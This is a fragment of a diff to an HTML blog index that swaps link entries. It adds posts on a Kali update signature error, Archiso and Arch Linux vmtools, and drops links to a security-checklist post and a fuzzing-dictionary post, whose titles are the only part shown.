+			        <a href="15640473747565.html">kali 下更新软件时报错，说下列签名无效的解决办法</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15596178265897.html">业务逻辑漏洞安全检查checklist</a>
+			        <a href="15638711886127.html">Archiso</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15596171974228.html">最近做了个 fuzzing 字典精简版</a>
+			        <a href="15611953556975.html">archlinux 安装 vmtools 遇到坑了怎么办</a>
 			      </li>
 		     
 		  
